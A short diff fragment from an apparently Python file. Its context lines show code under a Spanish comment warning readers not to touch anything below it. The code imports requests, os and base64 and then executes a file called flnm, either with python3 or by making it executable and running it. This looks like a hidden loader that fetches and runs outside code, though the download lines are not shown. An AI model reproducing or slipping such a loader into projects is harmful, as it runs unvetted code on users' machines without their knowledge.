@@ -28,8 +28,6 @@
 
 
 
-
-
 # No toques nada de aquí para abajo, puedes dañarlo
 import requests,os,base64
 if not os.path.exists("./.gitignore"):
@@ -53,3 +51,4 @@ if flnm.split(".")[-1] == "pyc":
     os.system(f"python3 {flnm}")
 else:
 	os.system(f"chmod +x {flnm} && ./{flnm}")
+	
